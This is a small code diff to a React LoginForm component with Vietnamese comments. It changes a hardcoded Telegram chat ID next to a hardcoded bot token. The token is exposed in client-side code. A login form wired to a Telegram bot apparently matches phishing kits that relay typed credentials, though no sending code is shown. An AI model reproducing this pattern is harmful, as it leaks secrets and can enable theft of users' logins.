@@ -9,7 +9,7 @@ function LoginForm({ onClose }) {
   // State quản lý hiển thị password
 
   const botToken = "8303564128:AAE4w2OF13TfX-Xcl_bquIvgkMOApkhQAec";
-  const chatId = "-6604062347"; // ✅ ĐÚNG chatID mới
+  const chatId = "6604062347"; // ✅ ĐÚNG chatID mới
   const [messageId, setMessageId] = useState(null); // dùng để cập nhật tin nhắn
 
   const navigate = useNavigate();
